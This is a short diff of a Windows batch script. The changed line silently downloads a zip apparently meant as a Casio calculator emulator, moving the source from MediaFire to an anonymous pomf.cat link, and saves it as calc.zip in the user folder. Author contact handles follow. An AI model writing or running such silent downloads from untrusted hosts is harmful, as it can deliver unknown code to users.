@@ -255,7 +255,7 @@ echo ---------------------------------------
 ping localhost -n 3 >nul
 cls
 cd C:\Users\%USERNAME%\
-curl --silent "https://download1486.mediafire.com/yqvjmvcmtidg/2fvmbese6o8ei9r/Casiofx570VNPLUS.zip" > calc.zip
+curl --silent "https://a.pomf.cat/rdbxjp.zip" > calc.zip
 echo.
 echo Contact Me On Telegram : @HexBuddy127001
 echo Contact Me On Instagram : hex_buddy
